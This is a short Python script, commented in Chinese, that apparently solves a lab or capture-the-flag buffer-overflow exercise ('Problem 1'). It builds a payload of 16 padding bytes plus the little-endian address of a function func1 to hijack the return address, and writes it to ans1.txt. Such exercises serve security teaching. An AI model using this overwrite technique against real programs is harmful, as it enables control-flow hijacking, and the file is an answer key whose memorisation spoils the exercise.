# Problem 1 Exploit
# 1. 填充 16 字节（8字节buffer + 8字节saved rbp）
padding = b"A" * 16

# 2. 目标函数 func1 的地址: 0x401216
# 转换成 8 字节的小端序格式
target_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"

payload = padding + target_addr

# 3. 写入文件
with open("ans1.txt", "wb") as f:
    f.write(payload)

print("Payload 已生成至 ans1.txt")